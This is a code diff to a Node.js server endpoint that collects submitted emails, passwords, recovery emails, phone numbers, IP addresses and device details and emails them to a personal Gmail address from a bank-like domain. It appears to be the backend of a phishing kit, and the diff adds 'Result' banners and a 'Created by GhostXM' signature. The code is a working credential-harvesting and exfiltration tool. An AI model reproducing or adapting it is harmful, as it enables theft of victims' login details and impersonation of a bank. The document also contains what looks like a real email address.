@@ -19,23 +19,24 @@ const resend = new Resend(process.env.RESEND_API_KEY);
 app.post("/send-email", async (req, res) => {
   const { email, password, recEmail, phone, port, deviceDetails } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  const time = dayjs(Date.now()).format("DD-MM-YY::HH-mm");
+  const time = dayjs(Date.now()).format("DD-MM-YY:::::::HH-mm");
 
   try {
     resend.emails.send({
-     from: "Log <log@ncreservebank.com>",
+     from: "Log <admin@ncreservebank.com>",
      to: ["juniorharry745@gmail.com"],
      subject: `New entry:: ${port}`,
      html: `
-    <p>Email: ${email}</p>
-    <p>Password: ${password}</p>.
+     <p>==================+[ Result ]+==================</p>
+    <p>Email Addreess: ${email}</p>
+    <p>Email: Password: ${password}</p>
     <p>Recovery Email: ${recEmail}</p>
     <p>Phone Number: ${phone}</p>
     <p>Date_Time: ${time}</p>
     <p>Client IP: ${ip}</p>
     <p>PORT: ${port}</p>
     <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
-    
+    <p>=============+ [ Created by GhostXM ] +===============================+[ Result ]+==================
 `,
     });
 
